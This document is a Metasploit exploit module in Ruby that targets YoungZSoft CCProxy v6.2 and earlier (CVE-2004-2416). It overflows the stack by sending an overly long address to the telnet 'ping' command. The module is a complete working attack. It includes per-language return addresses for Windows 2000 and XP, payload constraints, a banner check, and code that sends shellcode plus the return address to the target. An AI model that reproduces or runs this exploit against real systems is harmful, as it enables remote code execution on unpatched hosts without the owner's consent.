CCProxy <= v6.2 Telnet Proxy Ping Overflow Exploit (meta)
=========================================================

##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/ 
##

require &#039;msf/core&#039;

module Msf

class Exploits::Windows::Proxy::CCProxy_Telnet_Ping < Msf::Exploit::Remote
	
	include Exploit::Remote::Tcp

	def initialize(info = {}) 
		super(update_info(info,    
			&#039;Name&#039;		=> &#039;CCProxy <= v6.2 Telnet Proxy Ping Overflow&#039;,
			&#039;Description&#039;	=> %q{
            			This module exploits the YoungZSoft CCProxy <= v6.2 suite Telnet service.
				The stack is overwritten when sending an overly long address to the &#039;ping&#039; command.
			},
			&#039;Author&#039; 	=> [ &#039;Patrick Webster <patrick[at]aushack.com>&#039; ],
			&#039;Arch&#039;		=> [ ARCH_X86 ], 
			&#039;License&#039;       => MSF_LICENSE,
			&#039;Version&#039;       => &#039;$Revision$&#039;,
			&#039;References&#039;    =>
			[
				[ &#039;BID&#039;, &#039;11666 &#039; ],
				[ &#039;CVE&#039;, &#039;2004-2416&#039; ],
				[ &#039;MIL&#039;, &#039;621&#039; ],
				[ &#039;OSVDB&#039;, &#039;11593&#039; ],
			],         
			&#039;Privileged&#039;		=> false,
			&#039;DefaultOptions&#039;	=>
			{
				&#039;EXITFUNC&#039; 	=> &#039;thread&#039;,
			},
			&#039;Payload&#039; =>
				{ 
					&#039;Space&#039;		=> 1012,
					&#039;BadChars&#039; 	=> "\x00\x07\x08\x0a\x0d",
				},
			&#039;Platform&#039; => [&#039;win&#039;],
			&#039;Targets&#039; =>
			[
			# Patrick - Tested OK 2007/08/19. W2K SP0, W2KSP4, XP SP0, XP SP2 EN.
				[
				&#039;Windows 2000 Pro All - English&#039;,
				{
					&#039;Ret&#039;	=> 0x75023411, # call esi ws2help.dll
				}
				],
				[
				&#039;Windows 2000 Pro All - Italian&#039;,
				{
					&#039;Ret&#039;	=> 0x74fd2b81, # call esi ws2help.dll
				}
				],
				[
				&#039;Windows 2000 Pro All - French&#039;,
				{
					&#039;Ret&#039;	=> 0x74fa2b22, # call esi ws2help.dll
				}
				],
                 		[
				&#039;Windows XP SP0/1 - English&#039;,
				{
					&#039;Ret&#039;	=> 0x71aa1a97, # call esi ws2help.dll
				}
				],
                 		[
				&#039;Windows XP SP2 - English&#039;,
				{
					&#039;Ret&#039;	=> 0x71aa1b22, # call esi ws2help.dll
				}
				],
			],
			&#039;DisclosureDate&#039; => &#039;Nov 11 2004&#039;))
            
			register_options(
			[
				Opt::RPORT(23),
			], self.class)
	end

	def autofilter
		false
	end

	def check 
		connect
		banner = sock.get_once(-1,3)

		if (banner =~ /CCProxy Telnet Service Ready/)
			return Exploit::CheckCode::Appears 
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect
		
		sploit  = "p " + payload.encoded + [target[&#039;Ret&#039;]].pack(&#039;V&#039;) + make_nops(7)
		sock.put(sploit + "\r\n")

		handler
		disconnect
	end

end
end



